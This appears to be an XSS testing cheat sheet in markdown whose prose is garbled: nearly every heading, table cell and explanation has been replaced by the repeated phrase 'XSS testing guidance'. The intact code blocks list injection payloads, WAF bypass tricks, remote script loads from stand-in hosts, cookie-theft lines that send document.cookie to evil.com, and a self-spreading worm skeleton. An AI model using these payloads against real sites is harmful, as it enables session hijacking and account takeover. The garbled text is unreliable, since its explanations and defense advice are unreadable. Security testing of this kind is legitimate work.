# Web XSS testing guidance - XSS XSS testing guidance

> XSS testing guidance: WooYun XSS testing guidance（7,532 XSS XSS testing guidance）| XSS testing guidance web-injection.md

## XSS testing guidance、XSSXSS testing guidance

### 2.1 XSS testing guidance

```
XSS testing guidance(XSS testing guidance) -> XSS testing guidance -> XSS testing guidance -> XSS testing guidance
```

**XSS testing guidance**：XSS = XSS testing guidance + XSS testing guidance（XSS testing guidanceHTML/JS/CSS/URLXSS testing guidance）

### 2.2 XSS testing guidance

#### XSS testing guidance

| XSS testing guidance | XSS testing guidance | XSS testing guidance |
|-------|---------|---------|
| XSS testing guidance/XSS testing guidance | XSS testing guidance | XSS testing guidance、XSS testing guidance、XSS testing guidance |
| XSS testing guidance | XSS testing guidance | XSS testing guidance |
| XSS testing guidance/XSS testing guidance | XSS testing guidance | XSS testing guidance、XSS testing guidance、XSS testing guidance |
| XSS testing guidance/XSS testing guidance | XSS testing guidance | XSS testing guidance、XSS testing guidance |
| XSS testing guidance/XSS testing guidance | XSS testing guidance | XSS testing guidance |
| XSS testing guidance | XSS testing guidance | XSS testing guidance、XSS testing guidance |

**XSS testing guidance**（XSS testing guidance）：HTTPXSS testing guidance(XFF/UAXSS testing guidance)、WAPXSS testing guidancePCXSS testing guidance、XSS testing guidanceWebXSS testing guidance、XSS testing guidance/XSS testing guidance

#### XSS testing guidance

```
XSS testing guidance <script> XSS testing guidance？ -> JSXSS testing guidance（XSS testing guidance）
XSS testing guidance？    -> XSS testing guidance（XSS testing guidance）
XSS testing guidance？  -> HTMLXSS testing guidance（XSS testing guidancetextarea/title）
XSS testing guidanceURLXSS testing guidance？       -> URLXSS testing guidance（XSS testing guidance）
XSS testing guidanceCSSXSS testing guidance？       -> CSSXSS testing guidance（XSS testing guidanceexpressionXSS testing guidance）
```

### 2.3 XSS testing guidancePayload

#### HTMLXSS testing guidance

```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<iframe src="javascript:alert(1)">
```

#### HTMLXSS testing guidance

```html
" onclick=alert(1) "
" onfocus=alert(1) autofocus="
"><script>alert(1)</script><"
" onmouseover=alert(1) x="
```

#### JavaScriptXSS testing guidance

```javascript
';alert(1);//
'-alert(1)-'
\';alert(1);//
</script><script>alert(1)</script>
```

#### URLXSS testing guidance

```
javascript:alert(1)
data:text/html,<script>alert(1)</script>
data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
```

### 2.4 WAF/XSS testing guidance

#### XSS testing guidance

```html
<!-- HTMLXSS testing guidance -->
&#60;script&#62;alert(1)&#60;/script&#62;
&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;
<!-- Base64 + dataXSS testing guidance -->
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
<!-- CSSXSS testing guidance(IE) -->
xss:\65\78\70\72\65\73\73\69\6f\6e(alert(1))
```

#### XSS testing guidance/XSS testing guidance

```html
<ScRiPt>alert(1)</sCrIpT>              <!-- XSS testing guidance -->
<script/src=//xss.com/x.js>            <!-- XSS testing guidance -->
<img src=x onerror=alert(1)>           <!-- XSS testing guidance -->
<scrscriptipt>alert(1)</scrscriptipt>  <!-- XSS testing guidance -->
<scr\x00ipt>alert(1)</script>          <!-- XSS testing guidance -->
```

#### XSS testing guidance

```html
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<input onfocus=alert(1) autofocus>
<select autofocus onfocus=alert(1)>
<textarea autofocus onfocus=alert(1)>
<marquee onstart=alert(1)>
<video><source onerror=alert(1)>
<audio src=x onerror=alert(1)>
<details open ontoggle=alert(1)>
<body onload=alert(1)>
```

#### WAFXSS testing guidance

```html
.<script src=http://localhost/1.js>.    <!-- XSS testing guidance：XSS testing guidance -->
<!--[if true]><img onerror=alert(1) src=--> <!-- XSS testing guidance -->
```

#### XSS testing guidance

```html
<script src=//xss.pw/j>                <!-- XSS testing guidance -->
<!-- DOMXSS testing guidance -->
<script>var s=document.createElement('script');s.src='//x.com/x.js';document.body.appendChild(s)</script>
<!-- XSS testing guidance -->
<script>window['al'+'ert'](1)</script>
<!-- fromCharCode -->
<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
```

#### HTTPOnlyXSS testing guidance

- FlashXSS testing guidanceCookie
- XSS testing guidanceCSRFXSS testing guidance：XSS testing guidance（XSS testing guidance、XSS testing guidance、XSS testing guidancetoken）

### 2.5 XSS testing guidance

#### CookieXSS testing guidance

```html
<script>new Image().src="https://evil.com/c ="+document.cookie</script>
<img src=x onerror="new Image().src='https://evil.com/c ='+document.cookie">
<script>fetch('https://evil.com/c ='+document.cookie)</script>
```

#### DOM XSSXSS testing guidance

**XSS testing guidance**：`location.hash`, `location.search`, `document.referrer`, `window.name`, `document.URL`

**XSS testing guidance**：`innerHTML`, `outerHTML`, `document.write()`, `eval()`, `setTimeout()`, `element.src/href`

#### XSSXSS testing guidance

```javascript
// 1.XSS testing guidance(cookie/token)
// 2.XSS testing guidancepayloadXSS testing guidance
// 3.XSS testing guidance/XSS testing guidance（AJAX POST）
// 4.XSS testing guidance：XSS testing guidance/XSS testing guidance
function worm(){
    jQuery.post("/api/post", {"content": "<XSS testing guidancepayload>"})
}
worm()
```

#### XSS testing guidance

```
XSS + CSRF -> XSS testing guidanceTokenXSS testing guidance
XSS + SQLi -> XSS testing guidanceCookie -> XSS testing guidance
XSS -> XSS testing guidance -> XSS testing guidance -> XSS testing guidance
XSSXSS testing guidance(XSS testing guidance/XSS testing guidance/XSS testing guidance) -> XSS testing guidanceCookie
```

### 2.6 XSS testing guidance

- **XSS testing guidance**（XSS testing guidance）：HTMLXSS testing guidanceHTMLXSS testing guidance，JSXSS testing guidanceJSXSS testing guidance，URLXSS testing guidanceURLXSS testing guidance
- CSPXSS testing guidance
- HTTPOnlyXSS testing guidanceCookie
- XSS testing guidance（XSS testing guidance，XSS testing guidance）
- **XSS testing guidance**：XSS testing guidancescriptXSS testing guidance、XSS testing guidance、XSS testing guidance、XSS testing guidance

---

